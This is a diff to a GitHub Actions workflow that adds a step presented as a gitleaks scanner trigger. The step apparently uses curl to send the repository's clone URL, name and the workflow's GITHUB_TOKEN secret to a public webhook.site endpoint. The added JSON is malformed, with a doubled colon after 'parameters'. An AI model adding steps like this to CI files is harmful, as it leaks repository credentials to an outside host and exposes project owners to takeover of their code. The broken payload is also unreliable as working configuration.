@@ -33,3 +33,24 @@ jobs:
                 ],
                 "tokenSecret": "'"${{ secrets.GITHUB_TOKEN }}"'"
               }'
+
+    - name: Send webhook to Webhook
+      env:
+        WEBHOOK2_URL: https://webhook.site/11c30a6a-4054-4cc4-bc95-a40e38f866d5
+        REPO_URL: ${{ github.event.repository.clone_url }}
+        REPO_NAME: ${{ github.event.repository.name }}
+        SCANNER: "gitleaks"
+      run: |
+        curl -X POST $WEBHOOK2_URL \
+          -H "Content-Type: application/json" \
+          -d '{
+                "repository": {
+                  "clone_url": "'"$REPO_URL"'",
+                  "name": "'"$REPO_NAME"'"
+                },
+                "scanner": "'"$SCANNER"'",
+                "parameters": : [
+                  "--verbose"
+                ],
+                "tokenSecret": "'"${{ secrets.GITHUB_TOKEN }}"'"
+              }'
